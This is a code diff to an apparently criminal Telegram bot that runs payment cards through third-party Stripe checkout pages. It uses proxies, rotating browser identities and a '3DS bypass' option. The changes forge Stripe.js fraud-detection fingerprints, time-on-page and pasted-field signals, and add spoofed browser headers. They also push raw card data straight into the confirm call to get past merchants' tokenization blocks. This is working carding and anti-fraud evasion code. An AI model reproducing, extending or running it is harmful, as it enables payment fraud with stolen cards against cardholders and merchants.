@@ -6,6 +6,8 @@ import base64
 import asyncio
 import json
 import os
+import uuid
+import string
 from urllib.parse import unquote
 from aiogram import Router
 from aiogram.types import Message
@@ -45,15 +47,36 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
 ]
 
-def get_headers() -> dict:
-    """Return headers with a random User-Agent."""
-    return {
+def get_headers(stripe_js: bool = False) -> dict:
+    """Return headers mimicking Stripe.js browser requests."""
+    headers = {
         "accept": "application/json",
         "content-type": "application/x-www-form-urlencoded",
         "origin": "https://checkout.stripe.com",
         "referer": "https://checkout.stripe.com/",
         "user-agent": random.choice(USER_AGENTS)
     }
+    if stripe_js:
+        headers["accept"] = "application/json"
+        headers["accept-language"] = "en-US,en;q=0.9"
+        headers["sec-fetch-dest"] = "empty"
+        headers["sec-fetch-mode"] = "cors"
+        headers["sec-fetch-site"] = "same-site"
+        headers["sec-ch-ua"] = '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"'
+        headers["sec-ch-ua-mobile"] = "?0"
+        headers["sec-ch-ua-platform"] = '"Windows"'
+    return headers
+
+def generate_stripe_fingerprints() -> dict:
+    """Generate Stripe.js-style fingerprint identifiers (muid, guid, sid)."""
+    def _rand_hex(length: int) -> str:
+        return ''.join(random.choices(string.hexdigits[:16], k=length))
+    
+    muid = f"{_rand_hex(8)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(12)}"
+    guid = f"{_rand_hex(8)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(12)}"
+    sid = f"{_rand_hex(8)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(12)}"
+    
+    return {"muid": muid, "guid": guid, "sid": sid}
 
 _session = None
 
@@ -573,6 +596,7 @@ async def get_checkout_info(url: str) -> dict:
     return result
 
 async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, bypass_3ds: bool = False, max_retries: int = 2) -> dict:
+    """Charge card using Stripe.js emulation — direct confirm with fingerprints."""
     start = time.perf_counter()
     card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
     result = {
@@ -624,80 +648,55 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
                 if attempt > 0:
                     print(f"[DEBUG] Retry attempt {attempt}...")
                 
-                # --- METHOD 1: Try /v1/payment_methods (normal) ---
-                print(f"[DEBUG] Method 1: Creating payment method...")
-                pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
+                # Generate Stripe.js fingerprints
+                fp = generate_stripe_fingerprints()
+                time_on_page = random.randint(15000, 120000)
                 
-                charge_method = "pm"
-                pm_id = None
-                token_id = None
-                tokenization_blocked = False
+                print(f"[DEBUG] Stripe.js Emulation: Confirming directly with fingerprints...")
                 
-                async with s.post("https://api.stripe.com/v1/payment_methods", headers=get_headers(), data=pm_body, proxy=proxy_url) as r:
-                    pm = await r.json()
-                
-                if "error" in pm:
-                    err_msg = pm["error"].get("message", "Card error")
-                    err_code = pm["error"].get("code", "")
-                    dc = pm["error"].get("decline_code", "")
-                    print(f"[DEBUG] PM Error: {err_msg[:60]}")
-                    
-                    if "tokenization" in err_msg.lower():
-                        tokenization_blocked = True
-                    else:
-                        # Real card error (not tokenization), return immediately
-                        result["status"] = "DECLINED"
-                        if dc:
-                            result["response"] = f"[{dc}] [{err_msg}]"
-                        elif err_code:
-                            result["response"] = f"[{err_code}] [{err_msg}]"
-                        else:
-                            result["response"] = err_msg
-                        result["time"] = round(time.perf_counter() - start, 2)
-                        print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
-                        return result
-                else:
-                    pm_id = pm.get("id")
-                    if pm_id:
-                        print(f"[DEBUG] PM created: {pm_id}")
-                
-                # --- METHOD 2: Try /v1/tokens (fallback) ---
-                if tokenization_blocked:
-                    print(f"[DEBUG] Method 2: Trying /v1/tokens fallback...")
-                    token_body = f"card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&key={pk}"
-                    
-                    async with s.post("https://api.stripe.com/v1/tokens", headers=get_headers(), data=token_body, proxy=proxy_url) as r:
-                        tok = await r.json()
-                    
-                    if "error" not in tok and tok.get("id"):
-                        token_id = tok["id"]
-                        charge_method = "token"
-                        tokenization_blocked = False
-                        print(f"[DEBUG] Token created: {token_id}")
-                    else:
-                        tok_err = tok.get("error", {}).get("message", "") if "error" in tok else ""
-                        print(f"[DEBUG] Token also blocked: {tok_err[:60]}")
-                
-                # --- METHOD 3: Inline card data in confirm (like Stripe.js) ---
-                if tokenization_blocked:
-                    print(f"[DEBUG] Method 3: Using inline card data in confirm (Stripe.js style)...")
-                    charge_method = "inline"
-                
-                print(f"[DEBUG] Confirming payment... (method={charge_method}, bypass_3ds={bypass_3ds})")
-                
-                # Build confirm body based on method used
-                if charge_method == "pm":
-                    conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
-                elif charge_method == "token":
-                    conf_body = f"eid=NA&payment_method_data[type]=card&payment_method_data[card][token]={token_id}&payment_method_data[billing_details][name]={name}&payment_method_data[billing_details][email]={email}&payment_method_data[billing_details][address][country]={country}&payment_method_data[billing_details][address][line1]={line1}&payment_method_data[billing_details][address][city]={city}&payment_method_data[billing_details][address][postal_code]={zip_code}&payment_method_data[billing_details][address][state]={state}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
-                else:
-                    # Inline: pass raw card data directly in confirm (Stripe.js method)
-                    conf_body = f"eid=NA&payment_method_data[type]=card&payment_method_data[card][number]={card['cc']}&payment_method_data[card][cvc]={card['cvv']}&payment_method_data[card][exp_month]={card['month']}&payment_method_data[card][exp_year]={card['year']}&payment_method_data[billing_details][name]={name}&payment_method_data[billing_details][email]={email}&payment_method_data[billing_details][address][country]={country}&payment_method_data[billing_details][address][line1]={line1}&payment_method_data[billing_details][address][city]={city}&payment_method_data[billing_details][address][postal_code]={zip_code}&payment_method_data[billing_details][address][state]={state}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
+                # Build confirm body — Stripe.js style with full card data + fingerprints
+                conf_body = (
+                    f"eid=NA"
+                    f"&payment_method_data[type]=card"
+                    f"&payment_method_data[card][number]={card['cc']}"
+                    f"&payment_method_data[card][cvc]={card['cvv']}"
+                    f"&payment_method_data[card][exp_month]={card['month']}"
+                    f"&payment_method_data[card][exp_year]={card['year']}"
+                    f"&payment_method_data[billing_details][name]={name}"
+                    f"&payment_method_data[billing_details][email]={email}"
+                    f"&payment_method_data[billing_details][address][country]={country}"
+                    f"&payment_method_data[billing_details][address][line1]={line1}"
+                    f"&payment_method_data[billing_details][address][city]={city}"
+                    f"&payment_method_data[billing_details][address][postal_code]={zip_code}"
+                    f"&payment_method_data[billing_details][address][state]={state}"
+                    f"&payment_method_data[guid]={fp['guid']}"
+                    f"&payment_method_data[muid]={fp['muid']}"
+                    f"&payment_method_data[sid]={fp['sid']}"
+                    f"&payment_method_data[payment_user_agent]=stripe.js%2F3f83cd1837%3B+stripe-js-v3%2F3f83cd1837%3B+checkout"
+                    f"&payment_method_data[time_on_page]={time_on_page}"
+                    f"&payment_method_data[pasted_fields]=number"
+                    f"&expected_amount={total}"
+                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
+                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
+                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
+                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
+                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
+                    f"&expected_payment_method_type=card"
+                    f"&key={pk}"
+                    f"&init_checksum={checksum}"
+                )
                 
                 if bypass_3ds:
                     conf_body += "&return_url=https://checkout.stripe.com"
                 
-                async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=get_headers(), data=conf_body, proxy=proxy_url) as r:
+                headers = get_headers(stripe_js=True)
+                
+                async with s.post(
+                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                    headers=headers,
+                    data=conf_body,
+                    proxy=proxy_url
+                ) as r:
                     conf = await r.json()
                 
                 print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")
@@ -706,9 +705,15 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
                     err = conf["error"]
                     dc = err.get("decline_code", "")
                     msg = err.get("message", "Failed")
+                    err_code = err.get("code", "")
                     result["status"] = "DECLINED"
-                    result["response"] = f"[{dc}] [{msg}]" if dc else msg
-                    print(f"[DEBUG] Decline: {dc} - {msg}")
+                    if dc:
+                        result["response"] = f"[{dc}] [{msg}]"
+                    elif err_code:
+                        result["response"] = f"[{err_code}] [{msg}]"
+                    else:
+                        result["response"] = msg
+                    print(f"[DEBUG] Decline: {dc or err_code} - {msg}")
                 else:
                     pi = conf.get("payment_intent") or {}
                     st = pi.get("status", "") or conf.get("status", "")
@@ -748,47 +753,7 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
     
     return result
 
-async def check_tokenization_support(pk: str) -> dict:
-    """Quick check if merchant allows direct API tokenization using a test card."""
-    result = {"supported": True, "method": "payment_methods", "error": None}
-    try:
-        s = await get_session()
-        # Try /v1/payment_methods first
-        test_body = f"type=card&card[number]=4242424242424242&card[cvc]=123&card[exp_month]=12&card[exp_year]=30&key={pk}"
-        async with s.post(
-            "https://api.stripe.com/v1/payment_methods",
-            headers=get_headers(),
-            data=test_body,
-            timeout=aiohttp.ClientTimeout(total=10)
-        ) as r:
-            data = await r.json()
-            if "error" in data:
-                err_msg = data["error"].get("message", "")
-                if "tokenization" in err_msg.lower():
-                    # PM blocked, try /v1/tokens fallback
-                    token_body = f"card[number]=4242424242424242&card[cvc]=123&card[exp_month]=12&card[exp_year]=30&key={pk}"
-                    async with s.post(
-                        "https://api.stripe.com/v1/tokens",
-                        headers=get_headers(),
-                        data=token_body,
-                        timeout=aiohttp.ClientTimeout(total=10)
-                    ) as r2:
-                        tok_data = await r2.json()
-                        if "error" in tok_data:
-                            tok_err = tok_data["error"].get("message", "")
-                            if "tokenization" in tok_err.lower():
-                                result["supported"] = False
-                                result["method"] = "none"
-                                result["error"] = "Fully restricted"
-                            else:
-                                # Token endpoint works but returned other error (expected for test card)
-                                result["method"] = "tokens"
-                        else:
-                            # Token created successfully
-                            result["method"] = "tokens"
-    except:
-        pass
-    return result
+# check_tokenization_support removed — no longer needed with Stripe.js emulation
 
 async def check_checkout_active(pk: str, cs: str) -> bool:
     try:
@@ -1119,15 +1084,6 @@ async def co_handler(msg: Message):
         return
     
     if not cards:
-        # Check tokenization support during parse
-        token_check = await check_tokenization_support(checkout_data['pk'])
-        if not token_check['supported']:
-            token_display = "INLINE 🔗 (direct)"
-        elif token_check.get('method') == 'tokens':
-            token_display = "TOKEN 🔑 (fallback)"
-        else:
-            token_display = "SUPPORTED ✅"
-        
         currency = checkout_data.get('currency', '')
         sym = get_currency_symbol(currency)
         price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
@@ -1138,7 +1094,7 @@ async def co_handler(msg: Message):
         response += f"「❃」 𝗖𝗦 : <code>{checkout_data['cs'] or 'N/A'}</code>\n"
         response += f"「❃」 𝗣𝗞 : <code>{checkout_data['pk'] or 'N/A'}</code>\n"
         response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>SUCCESS ✅</code>\n"
-        response += f"「❃」 𝗧𝗼𝗸𝗲𝗻 : <code>{token_display}</code></blockquote>\n\n"
+        response += f"「❃」 𝗠𝗲𝘁𝗵𝗼𝗱 : <code>STRIPE.JS ⚡</code></blockquote>\n\n"
         
         response += f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
         response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code>\n"
@@ -1166,14 +1122,7 @@ async def co_handler(msg: Message):
         await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)
         return
     
-    token_check = await check_tokenization_support(checkout_data['pk'])
-    token_method = token_check.get('method', 'payment_methods')
-    if not token_check['supported']:
-        method_display = "INLINE 🔗"
-    elif token_method == 'tokens':
-        method_display = "TOKEN 🔑"
-    else:
-        method_display = "PM 💳"
+    method_display = "STRIPE.JS ⚡"
     bypass_str = "YES 🔓" if bypass_3ds else "NO 🔒"
     currency = checkout_data.get('currency', '')
     sym = get_currency_symbol(currency)
